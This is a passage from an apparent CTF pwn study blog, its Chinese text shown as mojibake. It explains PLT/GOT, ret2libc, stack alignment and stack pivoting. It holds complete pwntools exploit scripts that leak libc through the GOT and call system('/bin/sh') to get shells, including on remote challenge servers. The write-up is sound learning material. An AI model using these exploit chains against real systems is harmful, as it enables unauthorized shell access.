Tableï¼‰ï¼Œç”¨æ¥å­˜å‚¨å¤–éƒ¨å‡½æ•°çš„å…¥å£ç‚¹ï¼ˆentryï¼‰ï¼Œæ¢è¨€ä¹‹ï¼Œç¨‹åºä¼šåˆ°PLTä¸­å¯»æ‰¾å¤–éƒ¨å‡½æ•°çš„åœ°å€ã€‚PLTå­˜å‚¨åœ¨ä»£ç æ®µï¼ˆCode Segmentï¼‰å†…ï¼Œåœ¨è¿è¡Œä¹‹å‰å°±å·²ç»ç¡®å®šå¹¶ä¸”ä¸ä¼šè¢«ä¿®æ”¹ã€‚\nç®€å•æ¥è®²ï¼ŒGOTæ˜¯ä¸ªæ•°æ®è¡¨ï¼Œå­˜å‚¨çš„æ˜¯å¤–éƒ¨å‡½æ•°çš„åœ°å€ï¼Œå…·æœ‰è¯»å†™æƒé™ï¼ˆåœ¨FULL RELROä¿æŠ¤æœºåˆ¶å¼€å¯çš„æ—¶å€™ï¼Œæ²¡æœ‰è¯»å†™æƒé™ï¼‰ï¼›PLTæ˜¯å¤–éƒ¨å‡½æ•°çš„å…¥å£è¡¨ï¼Œå­˜å‚¨çš„æ˜¯æ¯ä¸ªå¤–éƒ¨å‡½æ•°çš„ä»£ç ï¼Œå…·æœ‰æ‰§è¡Œæƒé™ã€‚\nå°½ç®¡ libc çš„åŠ è½½åœ°å€æ˜¯éšæœºçš„ï¼ˆASLRï¼‰ï¼Œä½†åœ¨libcä¸åŒçš„æƒ…å†µä¸‹ libc å†…éƒ¨æ‰€æœ‰å‡½æ•°ç›¸å¯¹äº libc åŸºåœ°å€çš„åç§»é‡æ˜¯å›ºå®šä¸å˜çš„ã€‚è¿™æ˜¯ ret2libc æ”»å‡»çš„åŸºç¡€ã€‚\nå®é™…åœ°å€&#x3D;åŸºå€+åç§»\nå½“ä½ å†™äº†ä¸€ä¸ªç¨‹åºä½¿ç”¨äº† libc ä¸­çš„å‡½æ•°ï¼ˆå¦‚ printfï¼‰ï¼Œè¿™ä¸ªå‡½æ•°çš„å…·ä½“åœ°å€åœ¨ç¼–è¯‘æ—¶æ˜¯æœªçŸ¥çš„ï¼Œå› ä¸º libc è¢«åŠ è½½çš„ä½ç½®ä¼šå›  ASLRï¼ˆåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼‰è€Œå˜åŒ–ã€‚\n\n\n\nå‡½æ•°åç§°\nå†…å®¹\n\n\n\nPLT\næä¾›è·³è½¬æ¡©ä»£ç \n\n\nGOT\nå­˜æ”¾å®é™…å‡½æ•°åœ°å€\n\n\nå½“ä½ çš„ç¨‹åºè°ƒç”¨ printf() æ—¶ï¼Œå®é™…ä¸Šè°ƒç”¨çš„æ˜¯ PLT ä¸­çš„ printf@pltï¼ŒPLT å†é€šè¿‡ GOT æŸ¥æ‰¾çœŸæ­£çš„åœ°å€ã€‚\nğŸ” æ€»ç»“å¯¹æ¯”ï¼ˆé‡ç‚¹æ¥äº†ï¼ï¼‰\n\n\n\n\n\n\n\nä¸ºä»€ä¹ˆå¯ä»¥ç”¨ system@pltï¼Ÿ\nå› ä¸ºå®ƒæ˜¯ libc ä¸­system()å‡½æ•°çš„â€œå…¥å£å¤§é—¨â€ï¼Œè¿›å»ä»¥åå°±ä¼šè‡ªåŠ¨è·³è¿‡å»ï¼Œä¸ç”¨ä½ è‡ªå·±å»æ‰¾è·¯ã€‚\n\n\nä¸ºä»€ä¹ˆä¸ç”¨ GOTï¼Ÿ\nå› ä¸ºæˆ‘ä»¬ä¸æ˜¯è¦è¯»å–åœ°å€ï¼Œè€Œæ˜¯è¦è°ƒç”¨å‡½æ•°ã€‚PLT å°±åƒæŒ‰é’®ï¼ŒæŒ‰ä¸‹å»å°±èƒ½è¿è¡Œå‡½æ•°ï¼Œä¸éœ€è¦å…ˆçœ‹åœ°å€ã€‚\n\n\nä»€ä¹ˆæ—¶å€™å¿…é¡»ç”¨ GOTï¼Ÿ\nå½“ä½ åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šä¸çŸ¥é“ libc ç‰ˆæœ¬å’Œåœ°å€æ—¶ï¼Œå¿…é¡»å…ˆé€šè¿‡ GOT æ³„éœ²ä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œæ‰èƒ½è®¡ç®—å‡ºå…¶ä»–å‡½æ•°çš„åœ°å€ã€‚\n\n\nä»€ä¹ˆæ—¶å€™èƒ½ç›´æ¥ç”¨ PLTï¼Ÿ\nå½“ä½ åœ¨æœ¬åœ°è°ƒè¯•ã€libc æ˜¯å›ºå®šçš„ï¼Œè€Œä¸”ç¨‹åºæ²¡å¼€ PIEï¼ˆåœ°å€ä¸éšæœºåŒ–ï¼‰çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç›´æ¥è°ƒç”¨ PLTã€‚\n\n\nret2libc3 å¯ä»¥ç”¨ ret2syscall çš„æ–¹æ³•æ¥æ”»å‡»ï¼Œåªéœ€è¦æ‰¾åˆ°ç‰¹å®šçš„ã€å›ºå®šçš„ ROP gadgets å’Œ int 0x80 æŒ‡ä»¤ã€‚\né€‰æ‹© ret2libc çš„æ–¹æ³•ï¼Œé€šå¸¸æ˜¯å› ä¸º system() å‡½æ•°æä¾›çš„ä¾¿æ·æ€§æ›´é«˜ï¼Œè™½ç„¶å¤šäº†ä¸€æ­¥ libc æ³„éœ²çš„å¼€é”€ï¼Œä½†åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™ç§æ–¹æ³•æ›´â€œç®€å•â€ä¸”æ›´â€œé€šç”¨â€ã€‚\nåœ¨å®é™…çš„ CTF æ¯”èµ›ä¸­ï¼Œæ”»å‡»è€…ä¼šæ ¹æ®ç›®æ ‡ç¨‹åºçš„å…·ä½“æƒ…å†µï¼ˆæ˜¯å¦æœ‰æ˜“äºåˆ©ç”¨çš„ int 0x80ã€æ˜¯å¦æœ‰è¶³å¤Ÿçš„ gadgetsã€æ˜¯å¦æœ‰ &quot;/bin/sh&quot; å­—ç¬¦ä¸²ç­‰ï¼‰æ¥é€‰æ‹©æœ€ç®€å•ã€æœ€å¯é çš„æ”»å‡»æ–¹æ³•ã€‚\nret2libc3 ä¹‹æ‰€ä»¥éœ€è¦æ³„éœ² libc åœ°å€ï¼Œæ˜¯å› ä¸ºå®ƒä¾èµ–äºè°ƒç”¨ libc åº“ä¸­ï¼ˆè€Œéç¨‹åºè‡ªèº«ï¼‰çš„å°è£…å‡½æ•°ï¼ˆå¦‚ system()ï¼‰ï¼Œè€Œè¿™äº› libc å‡½æ•°çš„åœ°å€ä¼šå—åˆ° ASLR (åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–) çš„å½±å“è€ŒéšæœºåŒ–ã€‚ret2syscall èƒ½å¤Ÿä¸æ³„éœ² libc åœ°å€ï¼Œæ˜¯å› ä¸ºå®ƒä¾èµ–äºç¨‹åºè‡ªèº«æˆ–åŠ è½½åˆ°å›ºå®šåœ°å€çš„å…±äº«åº“ä¸­çš„ ROP gadget å’Œ int 0x80 æŒ‡ä»¤ï¼Œè¿™äº›åœ°å€åœ¨æ²¡æœ‰ PIE (ä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶) çš„æƒ…å†µä¸‹æ˜¯å›ºå®šçš„ã€‚\nret2libc3_x6432ä½ç¨‹åºçš„payloadéƒ½æ˜¯åœ¨è¿”å›åœ°å€ä¹‹ååŠ ä¸Šå‚æ•°ï¼Œè€Œ64ä½æ˜¯åœ¨è¿”å›åœ°å€ä¹‹å‰æŠŠå‚æ•°æ”¾å…¥å¯„å­˜å™¨ä¸­\n64ä½ç¨‹åºå’Œ32ä½ç¨‹åºçš„ROPæŠ€æœ¯çš„ä¸åŒç‚¹åœ¨äºå‚æ•°ä¼ é€’çš„æ–¹å¼ä¸åŒã€‚64ä½ç¨‹åºçš„å‰6ä¸ªå‚æ•°æ˜¯rdi,rsi,rdx,rcx,r8,r9ï¼Œåç»­å‚æ•°æ‰ä¼šæ”¾åœ¨æ ˆä¸Šï¼Œæ‰€ä»¥64ä½ç¨‹åºçš„ROPå’Œret2syscallå‡ ä¹æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯å…ˆæ§åˆ¶å¯„å­˜å™¨ï¼Œå†è·³è½¬åˆ°å¯¹åº”çš„å‡½æ•°è¿›è¡Œæ“ä½œã€‚\nè„šæœ¬from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3_x64&quot;)#gdb.attach(p,&quot;b *0x00000000004006F1&quot;)elf = ELF(&quot;./ret2libc3_x64&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]main_addr = elf.symbols[&quot;main&quot;]rdi = 0x0000000000400783 # pop rdi ; retret_gadget = 0x0000000000400784 # Assuming this is a &#x27;ret&#x27; instruction for stack alignmentp.recvuntil(b&quot;ret2libc3_x64\\n&quot;)payload1 = b&quot;a&quot; * (0x108)payload1 += p64(rdi) + p64(gets_got)payload1 +=p64(puts_plt)+p64(main_addr)p.sendline(payload1)leak_addr = u64(p.recv(6).ljust(8, b&quot;\\x00&quot;))libc = LibcSearcher(&quot;gets&quot;, leak_addr)libc_base = leak_addr - libc.dump(&quot;gets&quot;)#libc.address = libc_base#æˆ‘æ„Ÿè§‰æ²¡ä»€ä¹ˆç”¨log.success(&quot;libc_base:&quot; + hex(libc_base))system = libc_base + libc.dump(&quot;system&quot;)binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)# ====== ä¿®æ”¹å¼€å§‹ï¼šæ·»åŠ  GDB åŠ¨æ€ä¸‹æ–­ç‚¹ ======gdb.attach(p, f&#x27;b *&#123;hex(system)&#125;&#x27;)  # åœ¨ system åœ°å€å¤„ä¸‹æ–­ç‚¹# ====== ä¿®æ”¹ç»“æŸ ======p.recvuntil(b&quot;ret2libc3_x64\\n&quot;)payload2 = b&quot;a&quot; * (0x108)payload2 += p64(rdi) + p64(binsh)payload2 += p64(ret_gadget)payload2 += p64(system)p.sendline(payload2)p.interactive()\n\n\n\nå¯¹äºpayload2ç”±äºè€ƒè™‘å †æ ˆå¹³è¡¡ï¼Œæ‰€ä»¥ä¼šæœ‰ä¸¤ä¸ªretæŒ‡ä»¤æ”¾åœ¨ä¸€èµ·\npayload2 +&#x3D; p64(rdi) + p64(binsh)payload2 +&#x3D; p64(ret_gadget)\nå †æ ˆå¹³è¡¡64ä½ç¨‹åºä¸­ï¼Œå‡½æ•°è°ƒç”¨å‰ï¼Œæ ˆæŒ‡é’ˆï¼ˆrspï¼‰å¿…é¡»æ˜¯ 16 å­—èŠ‚å¯¹é½çš„ \n32ä½ç¨‹åºä¸­ï¼Œå‡½æ•°è°ƒç”¨å‰åï¼Œæ ˆæŒ‡é’ˆ esp çš„å€¼åº”è¯¥ä¿æŒä¸å˜ï¼ˆ32ä½ä¸€èˆ¬ä¸è€ƒè™‘å †æ ˆå¹³è¡¡ï¼‰\nâœ… ä¸€ã€é™æ€åˆ†æï¼šè®¡ç®—æ ˆåç§»\nä¸ºäº†æ ˆå¯¹é½ï¼ˆé¿å…å´©æºƒï¼‰ï¼Œä½ æ„é€ çš„ payload ä¸­â€œé™¤äº†å¡«å……éƒ¨åˆ†â€ä¹‹å¤–çš„å†…å®¹ï¼ˆå³ gadget å’Œå‚æ•°ï¼‰æœ€å¥½æ˜¯ä¸€ä¸ªå¶æ•°å—ï¼ˆ8 å­—èŠ‚ä¸ºä¸€å—ï¼‰\nâœ… äºŒã€åŠ¨æ€è°ƒè¯•ï¼šä½¿ç”¨ GDB æŸ¥çœ‹ rsp çš„å€¼\nå¯¹äºè¿™ä¸€é¢˜æ¥è¯´ï¼Œåœ¨ç¡®å®šäº†libc.soåº“å’ŒlibcåŸºå€ä¹‹åï¼Œåœ¨systemå‡½æ•°å†…åœ¨systemå¤„è®¾ç½®æ–­ç‚¹\nä¹‹åè¿è¡Œè¿™ä¸ªè„šæœ¬\n\nè¿™é‡Œå°±é€‰æ‹©å¥½libcç‰ˆæœ¬äº†\nä¹‹ååŠ¨æ€è°ƒè¯•æŸ¥çœ‹\n\nåœ¨åˆšè¿›å…¥è¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€æ­¥ï¼Œå°±å·²ç»å¤„äºä¸å¹³è¡¡çš„çŠ¶æ€äº†\nå› ä¸ºå®ƒåœ¨è°ƒç”¨å‰æ˜¯æ ˆå¹³è¡¡ï¼Œè°ƒç”¨æ—¶ä¼šæœ‰push rsp æŒ‡ä»¤æ”¹å˜\næŸ¥çœ‹æ ˆé¡¶çš„å‘½ä»¤æ˜¯\ninfo register rsp\n\n\n\n\n\næ³¨æ„å¯¹äºæ„é€ çš„ropé“¾\nå¡«å……è¿”å›åœ°å€\n\n\nå¡«å……çš„è¿”å›åœ°å€\næ•ˆæœ\n\n\n\nmain()\nè®©ç¨‹åºé‡æ–°è¿è¡Œ main å‡½æ•°ï¼ˆå¯é‡å¤åˆ©ç”¨ï¼‰\n\n\n_start\né‡æ–°å¼€å§‹æ•´ä¸ªç¨‹åº\n\n\nshellcode åœ°å€\nå¦‚æœä½ æƒ³ç»§ç»­æ‰§è¡Œè‡ªå·±çš„ä»£ç \n\n\nexit()æˆ–_exit()\nå®‰å…¨é€€å‡ºç¨‹åº\n\n\nè¿”å›åœ°å€å†™0çš„æ—¶å€™å¶å°”ä¼šæŠ¥é”™\nè¿”å›åœ°å€å¤„ç†ğŸ¯ 2. 32 ä½ vs 64 ä½åœ°å€\n\n\n\né¡¹ç›®\n32 ä½\n64 ä½\n\n\n\nåœ°å€é•¿åº¦ï¼ˆä½ï¼‰\n32 ä½ &#x3D; 4 å­—èŠ‚\n64 ä½ &#x3D; 8 å­—èŠ‚\n\n\nPython é‡Œçš„è¡¨ç¤º\n0xdeadbeef\n0x7fffdeadbeef\n\n\næ‰“åŒ…å‡½æ•°\np32()\np64()\n\n\nè§£åŒ…å‡½æ•°\nu32()\nu64()\n\n\n32ä½æ¥æ”¶\nleak = p.recv(4)      # 32ä½æ³„éœ²ä¸€èˆ¬æ˜¯4å­—èŠ‚addr = u32(leak)      # è½¬æˆ int\n\n64ä½æ¥æ”¶\nleak = p.recv(6)              # é€šå¸¸èƒ½æ”¶åˆ°6å­—èŠ‚ï¼Œæœ‰æ—¶å€™é«˜ä¸¤å­—èŠ‚æ˜¯0addr = u64(leak.ljust(8, b&#x27;\\x00&#x27;))  # è¡¥æˆ8å­—èŠ‚å†è§£åŒ…\n\nljust(length, fillchar) ä¼šå°†å½“å‰çš„å­—èŠ‚ä¸² leak å·¦å¯¹é½åˆ°æŒ‡å®šçš„ lengthï¼ˆè¿™é‡Œæ˜¯ 8 å­—èŠ‚ï¼‰ï¼Œå¹¶ä½¿ç”¨ fillcharï¼ˆè¿™é‡Œæ˜¯ b&#39;\\x00&#39;ï¼Œå³ç©ºå­—èŠ‚ï¼‰ä»å³ä¾§è¿›è¡Œå¡«å……ã€‚\næŸ¥çœ‹è°ƒç”¨å‡½æ•°çš„ä¼ é€’çš„å‚æ•°payload=b&#x27;a&#x27;*(0x48+4)+p32(sys)+p32(main_addr)+p32(sh_addr)\n\n\n1. åˆå§‹çŠ¶æ€ï¼ˆæ‰§è¡Œ ret å‰ï¼‰\nå‡è®¾æ­¤æ—¶æ ˆå¸ƒå±€å¦‚ä¸‹ï¼ˆæ ¹æ®ä½ çš„ payloadï¼‰ï¼š\npython\npayload = b&#x27;a&#x27;*(0x48+4) + p32(sys) + p32(0x08048722) + p32(sh)\n\n\næ ˆå†…å­˜å¸ƒå±€ï¼š\ntext\nesp        -&gt; 0x80484d0          ï¼ˆè¦†ç›–çš„è¿”å›åœ°å€ï¼ŒæŒ‡å‘ system@pltï¼‰esp + 4    -&gt; 0x08048722         ï¼ˆä¼ªé€ çš„è¿”å›åœ°å€ï¼‰esp + 8    -&gt; 0x080482ea         ï¼ˆå‚æ•° &quot;sh&quot; çš„åœ°å€ï¼‰\n\nå¯„å­˜å™¨çŠ¶æ€ï¼š\n\neipï¼šæŒ‡å‘ GetFlag+90 çš„ ret æŒ‡ä»¤ã€‚\nespï¼šæŒ‡å‘æ ˆé¡¶ 0x80484d0ã€‚\n\n\n\n2. æ‰§è¡Œ ret æŒ‡ä»¤\nret ç­‰ä»·äº pop eipï¼Œå…·ä½“æ“ä½œï¼š\n\nä»æ ˆé¡¶å¼¹å‡ºè¿”å›åœ°å€åˆ° eipï¼š\n\neip = [esp] â†’ eip = 0x80484d0ï¼ˆè·³è½¬åˆ° system@pltï¼‰ã€‚\nesp = esp + 4 â†’ æ ˆæŒ‡é’ˆä¸Šå‡ 4 å­—èŠ‚ã€‚\n\n\næ ˆå˜åŒ–ï¼š\ntext\nesp        -&gt; 0x08048722         ï¼ˆåŸ esp + 4ï¼‰esp + 4    -&gt; 0x080482ea         ï¼ˆå‚æ•° &quot;sh&quot;ï¼‰\n\n3. è¿›å…¥ system@plt åçš„æµç¨‹\n(1) é¦–æ¬¡è°ƒç”¨ system@pltï¼ˆGOT æœªè§£æï¼‰\nsystem@plt çš„ä»£ç ï¼š\nasm\n0x80484d0 &lt;system@plt&gt;    jmp    [0x804a024]   ; è·³è½¬åˆ° GOT è¡¨ï¼ˆé¦–æ¬¡æŒ‡å‘ä¸‹ä¸€è¡Œï¼‰0x80484d6 &lt;system@plt+6&gt;  push   0x30          ; é‡å®šä½åç§»0x80484db &lt;system@plt+11&gt; jmp    0x8048460     ; è·³è½¬åˆ°åŠ¨æ€é“¾æ¥å™¨\n\n\njmp [0x804a024]ï¼š\n\né¦–æ¬¡è°ƒç”¨æ—¶ï¼ŒGOT è¡¨ 0x804a024 ä¸­çš„å€¼ä¸º 0x80484d6ï¼ˆå³ system@plt+6ï¼‰ï¼Œå› æ­¤ç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚\n\n\npush 0x30ï¼š\n\nesp = esp - 4 â†’ æ ˆæŒ‡é’ˆä¸‹é™ 4 å­—èŠ‚ã€‚\n\n[esp] = 0x30 â†’ å°† 0x30 å‹æ ˆã€‚\n\næ ˆå˜åŒ–ï¼š\ntext\nesp        -&gt; 0x30               ï¼ˆæ–°å‹å…¥çš„å€¼ï¼‰esp + 4    -&gt; 0x08048722         ï¼ˆä¼ªé€ çš„è¿”å›åœ°å€ï¼‰esp + 8    -&gt; 0x080482ea         ï¼ˆå‚æ•° &quot;sh&quot;ï¼‰\n\n\njmp 0x8048460ï¼š\n\nè·³è½¬åˆ°åŠ¨æ€é“¾æ¥å™¨ï¼ˆ_dl_runtime_resolveï¼‰ï¼Œè§£æ system çš„çœŸå®åœ°å€å¹¶æ›´æ–° GOT è¡¨ã€‚\n*(2) åŠ¨æ€é“¾æ¥å™¨è§£æå®Œæˆå\n\n\nåŠ¨æ€é“¾æ¥å™¨ä¼šå°† system çš„çœŸå®åœ°å€å†™å…¥ GOT è¡¨ 0x804a024ã€‚\n\nåç»­è·³è½¬åˆ° system çš„çœŸå®ä»£ç ã€‚\n\n\n4. æ‰§è¡Œ system å‡½æ•°æ—¶\n(1) system çš„è°ƒç”¨çº¦å®šï¼ˆcdeclï¼‰\n\nå‚æ•°é€šè¿‡æ ˆä¼ é€’ï¼š\n\ncall system ä¼šéšå¼å‹å…¥è¿”å›åœ°å€ï¼ˆä½†ä½ çš„æ¼æ´åˆ©ç”¨ç›´æ¥è·³è½¬åˆ° system@pltï¼Œæœªé€šè¿‡ callï¼‰ã€‚\nå‚æ•°ä½äº esp + 4ï¼ˆå› ä¸º esp æŒ‡å‘è¿”å›åœ°å€ï¼‰ã€‚\n\n\nä½ çš„åœºæ™¯ï¼š\n\nåŠ¨æ€é“¾æ¥å™¨è§£æå®Œæˆåï¼Œç›´æ¥è·³è½¬åˆ° system çš„çœŸå®ä»£ç ã€‚\n\næ­¤æ—¶æ ˆå¸ƒå±€ï¼š\ntext\nesp        -&gt; 0x08048722         ï¼ˆä¼ªé€ çš„è¿”å›åœ°å€ï¼‰esp + 4    -&gt; 0x080482ea         ï¼ˆå‚æ•° &quot;sh&quot;ï¼‰\n\nsystem ä¼šä» esp + 4 è¯»å–å‚æ•°ï¼ˆå³ 0x080482eaï¼‰ï¼Œæ‰§è¡Œ system(&quot;sh&quot;)ã€‚\n\n\n\n\n(2) system æ‰§è¡Œåçš„æ ˆå¹³è¡¡\n\nå¦‚æœæ˜¯æ­£å¸¸ call systemï¼Œè°ƒç”¨è€…éœ€é€šè¿‡ add esp, 4 æ¸…ç†å‚æ•°ã€‚\nä½†ä½ çš„æ¼æ´åˆ©ç”¨ä¸­ï¼š\né€šè¿‡ ret è·³è½¬åˆ° system@pltï¼Œæœªæ˜¾å¼ä½¿ç”¨ callã€‚\nsystem æ‰§è¡Œå®Œæ¯•åä¼šè¿”å›åˆ° 0x08048722ï¼ˆä¼ªé€ çš„åœ°å€ï¼‰ã€‚\n\n\n\n5. å…¨ç¨‹ esp å˜åŒ–æ€»ç»“\n\n\n\næ­¥éª¤\nesp å˜åŒ–\næ ˆå¸ƒå±€ï¼ˆæ ˆé¡¶å‘ä¸‹ï¼‰\n\n\n\næ‰§è¡Œ ret å‰\nesp â†’ 0x80484d0\n[0x80484d0, 0x08048722, 0x080482ea]\n\n\næ‰§è¡Œ ret\nesp += 4 â†’ 0x08048722\n[0x08048722, 0x080482ea]\n\n\nsystem@plt ä¸­ push 0x30\nesp -= 4 â†’ 0x30\n[0x30, 0x08048722, 0x080482ea]\n\n\nåŠ¨æ€é“¾æ¥å™¨è§£æå®Œæˆ\nesp æ¢å¤ä¸º 0x08048722\n[0x08048722, 0x080482ea]\n\n\nsystem è¯»å–å‚æ•°\nä» esp + 4 è¯»å– 0x080482ea\nå‚æ•° &quot;sh&quot; è¢«æ­£ç¡®ä¼ é€’\n\n\n6. å…³é”®ç»“è®º\n\nret ç›´æ¥ä¿®æ”¹ eip å’Œ espï¼š\né€šè¿‡å¼¹å‡ºè¿”å›åœ°å€å®ç°æ§åˆ¶æµåŠ«æŒï¼Œesp ä¼š +4ã€‚\n\n\nsystem çš„å‚æ•°ä¼ é€’ä¾èµ–æ ˆå¸ƒå±€ï¼š\nç¡®ä¿ ret åï¼Œesp + 4 æŒ‡å‘å‚æ•°åœ°å€ï¼ˆä½ çš„ payload å·²æ»¡è¶³ï¼‰ã€‚\n\n\nåŠ¨æ€é“¾æ¥çš„é¢å¤–æ ˆæ“ä½œï¼š\né¦–æ¬¡è°ƒç”¨ PLT æ—¶ä¼šæœ‰ push 0x30ï¼Œesp ä¼š -4ï¼Œä½†æœ€ç»ˆä¸å½±å“å‚æ•°ä½ç½®ã€‚\n\n\n\né€šè¿‡æ§åˆ¶ ret åçš„æ ˆå¸ƒå±€ï¼Œä½ æˆåŠŸå°† &quot;sh&quot; ä¼ é€’ç»™ systemï¼Œæœ€ç»ˆè·å– shellã€‚\n","categories":["pwn_study"],"tags":["PWN"]},{"title":"æ ˆè¿ç§»","url":"/2025/08/01/%E6%A0%88%E8%BF%81%E7%A7%BB/","content":"åŸºç¡€ä¸¤ä¸ªå¯¹bufçš„è¾“å…¥pwn75\n\n\nä½ç½®ä¸å¤Ÿï¼Œä¸”æœ‰systemå‡½æ•°ä½†æ²¡æœ‰â€œ&#x2F;bin&#x2F;shâ€å­—ç¬¦ä¸²\næ€è·¯æ³„éœ²ebpçš„åœ°å€ï¼Œç„¶ågdbè°ƒè¯•æ‰¾åˆ°bufå¼€å¤´å’Œebpä¹‹é—´çš„åç§»ä»¥æ‰¾åˆ°bufçš„ä½ç½®\nä¹‹åé€šè¿‡ç¬¬äºŒæ¬¡è¾“å…¥å¯¹è°ƒç”¨systemå‡½æ•°ï¼Œå¹¶åœ¨payloadä¸­ä¼ å…¥å­—ç¬¦ä¸²â€œ&#x2F;bin&#x2F;sh\\x00â€ï¼Œä¹‹åé€šè¿‡è¿™ä¸ªå‡½æ•°çš„retè®©ç¨‹åºè¿”å›åˆ°bufå¼€å¤´å¤„æ‰§è¡Œåé—¨å‡½æ•°\n\nå·®æ˜¯0x38\nè„šæœ¬from pwn import *context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#p = process(&#x27;./pwn75&#x27;)p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28124)p.recvuntil(b&quot;codename:&quot;)payload=b&quot;a&quot;*0x24+b&quot;1234&quot;p.send(payload)p.recvuntil(b&quot;1234&quot;)ebp = u32(p.recv(4))print(hex(ebp))leave=0x080486ACsystem=0x08048400main=0x08048768off=0x38buf=ebp-offp.recvuntil(b&quot;want to do?&quot;)payload=p32(system)+p32(main)+p32(buf+12)+b&quot;/bin/sh\\x00&quot;payload=payload.ljust(0x28,b&quot;a&quot;)payload+=p32(buf-4)+p32(leave)p.sendline(payload)p.interactive()\n\npayload=p32(system)+p32(main)+p32(buf+12)+b&quot;/bin/sh\\x00&quot;\n\næŠŠ&#x2F;bin&#x2F;shå­—ç¬¦æ®µé€šè¿‡payloadæ”¾å…¥æ ˆä¸Šï¼Œä¹‹åå†systemå‡½æ•°çš„çš„å‚æ•°ä½ç½®æ”¾ç½®&#x2F;bin&#x2F;shå­—ç¬¦ä¸²çš„ä½ç½®\npayload=b&quot;a&quot;*0x24+b&quot;1234&quot;p.send(payload)p.recvuntil(b&quot;1234&quot;)ebp = u32(p.recv(4))print(hex(ebp))\n\næ³¨æ„sendlineä¼šåœ¨å‘é€payloadä¹‹åå†å‘é€ä¸€ä¸ª&#x2F;n\nä¼šå½±å“æ¥æ”¶æ•°æ®\nä¸€ä¸ªsä¸€ä¸ªbuf[Black Watch å…¥ç¾¤é¢˜]PWN\n\n\n\næ²¡æœ‰systemå‡½æ•°\næ€è·¯é€šè¿‡sè®¾ç½®ropé“¾æ³„éœ²gotè¡¨åœ°å€ï¼Œä¹‹åè¿”å›mainå‡½æ•°ç»§ç»­æ‰§è¡Œï¼Œbufè¿”å›så»æ‰§è¡Œropé“¾\né€šè¿‡æ³„éœ²çš„gotè¡¨åœ°å€å¾—åˆ°systemçš„éœ€è¦ä¿¡æ¯ï¼Œæ„é€ åé—¨å‡½æ•°\nåœ¨sæ”¾ç½®æ„é€ å¥½çš„åé—¨å‡½æ•°ï¼Œé€šè¿‡bufè®©å‡½æ•°è¿›å…¥æ‰§è¡Œ\nè„šæœ¬from pwn import *from LibcSearcher import *context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#p= process(&#x27;./spwn&#x27;)p= remote(&quot;node5.buuoj.cn&quot;,28120)elf=ELF(&quot;./spwn&quot;)#gdb.attach(p,&quot;b *0x08048511&quot;)#bss=elf.bss()s=0x0804A300write_plt=elf.plt[&#x27;write&#x27;]write_got=elf.got[&#x27;write&#x27;]main=0x8048513leave=0x08048511payload=p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)p.recvuntil(b&quot;What is your name?&quot;)p.send(payload)p.recvuntil(b&quot;What do you want to say?&quot;)payload1=b&quot;a&quot;*24+p32(s-4)+p32(leave)p.send(payload1)write=u32(p.recv(4))print(hex(write))libc=LibcSearcher(&quot;write&quot;,write)libc_base=write-libc.dump(&#x27;write&#x27;)system=libc_base+libc.dump(&#x27;system&#x27;)sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload=p32(system)+p32(0)+p32(sh)p.recvuntil(b&quot;What is your name?&quot;)p.send(payload)p.recvuntil(b&quot;What do you want to say?&quot;)p.send(payload1)p.interactive()\n\næ³¨æ„:è¿”å›åœ°å€å¿…é¡»å†™mainçš„åœ°å€\nåœ¨ vul_function å‡½æ•°ä¸­ï¼Œç¨‹åºä¼šåœ¨æ ˆä¸Šåˆ›å»ºä¸€ä¸ªåä¸ºbuf çš„ç¼“å†²åŒºã€‚\nå¦‚æœä½ çš„ ROP é“¾æ²¡æœ‰å›åˆ° mainï¼Œè€Œæ˜¯ç›´æ¥å›åˆ° vul_functionï¼Œé‚£ä¹ˆ vul_function åœ¨é‡æ–°æ‰§è¡Œæ—¶ä¼šå†æ¬¡åˆ›å»ºæ ˆå¸§ï¼Œè¿™å¯èƒ½ä¼šå½±å“ä½ ç¬¬ä¸€æ¬¡æ³„æ¼ååœ¨ .bss åŒºåŸŸå¸ƒç½®çš„ ROP é“¾ã€‚\nmain å‡½æ•°çš„ç»“æ„éå¸¸ç®€å•ï¼Œå®ƒåªè°ƒç”¨ vul_functionï¼Œå› æ­¤å®ƒçš„æ ˆå¸§éå¸¸ç¨³å®šï¼Œä¸ä¼šå¹²æ‰° bss æ®µä¸­çš„æ•°æ®ã€‚\nå½“vul_functionå‡½æ•°å¯ä»¥æ­£å¸¸è¿”å›çš„æ—¶å€™ï¼Œå®ƒçš„æ ˆå¸§ä¼šè¢«æ¸…ç†è€Œä¸å½±å“ä¸‹ä¸€æ­¥\nè¿›é˜¶canary+è¿ç§»é™„ä»¶\n\n\n\nè¾“å…¥çš„æœ€è¿œä½ç½®åªåˆ°retçš„åœ°å€ï¼Œè€Œä¸”æ²¡æœ‰systemå‡½æ•°ï¼Œæ‰€ä»¥è¦æ 